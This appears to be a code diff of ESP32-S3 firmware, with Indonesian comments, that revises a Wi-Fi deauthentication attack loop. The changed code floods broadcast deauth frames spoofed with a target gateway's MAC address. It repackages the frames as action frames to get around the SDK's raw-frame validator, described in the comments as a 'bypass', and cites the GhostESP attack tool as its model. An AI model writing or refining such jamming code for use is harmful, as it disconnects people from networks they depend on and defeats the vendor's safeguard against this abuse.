@@ -124,13 +124,12 @@ void loopWiFi(void * pvParameters) {
 
     // --- 3. LOGIKA DEAUTH (OMEGA BYPASS S3) ---
     // Pindahin ke luar biar mandiri Cok!
-                else if (isDeauthing && adaTarget) {
+    else if (isDeauthing && adaTarget) {
       if (!deauthUdahSetup) {
         esp_wifi_stop();
         esp_wifi_set_mode(WIFI_MODE_APSTA); 
         esp_wifi_start();
         esp_wifi_set_ps(WIFI_PS_NONE); 
-        // Ghost Trick: Aktifin CSI biar hardware validator 'longgar'
         esp_wifi_set_promiscuous(true);
         esp_wifi_set_channel(targetTerkunci.channel, WIFI_SECOND_CHAN_NONE);
         deauthUdahSetup = true;
@@ -140,26 +139,22 @@ void loopWiFi(void * pvParameters) {
       stringToMac(targetTerkunci.mac, gatewayMAC); 
       uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
 
-      // Ghost Padding: S3 v5.5.1 benci paket 26 byte. Kita kasih 36 byte!
-      uint8_t ghostPkt[36]; 
+      uint8_t ghostPkt[36]; // Tetap pake padding 36 byte
       memset(ghostPkt, 0, 36);
-      memcpy(ghostPkt, deauthFrame, 26); // Isi data deauth standar
 
       for (int b = 0; b < 60; b++) {
-        uint16_t seq = (uint16_t)((esp_random() & 0xFFF) << 4);
-        ghostPkt[0] = 0xc0; 
-        memcpy(&ghostPkt[4],  broadcast, 6);
-        memcpy(&ghostPkt[10], gatewayMAC, 6);
-        memcpy(&ghostPkt[16], gatewayMAC, 6);
-        ghostPkt[22] = seq & 0xFF;
-        ghostPkt[23] = (seq >> 8) & 0xFF;
+        // --- JANGAN PAKE ghostPkt[0] = 0xc0 ---
+        // Pake fungsi sakti lu yang bungkus deauth di dalem Action Frame (0xD0)
+        buildOptimizedDeauthFrame(ghostPkt, broadcast, gatewayMAC, gatewayMAC, 0x01, false);
 
-        // Tembak pake WIFI_IF_AP sesuai gaya GhostESP di SDK 5.5.1
+        // Tembak lewat WIFI_IF_AP (Interface 1) - PAKSA TRUE
         esp_wifi_80211_tx(WIFI_IF_AP, ghostPkt, 36, true); 
-        delayMicroseconds(100);
+        
+        delayMicroseconds(150);
       }
       vTaskDelay(1 / portTICK_PERIOD_MS);
     }
+
 
 
    
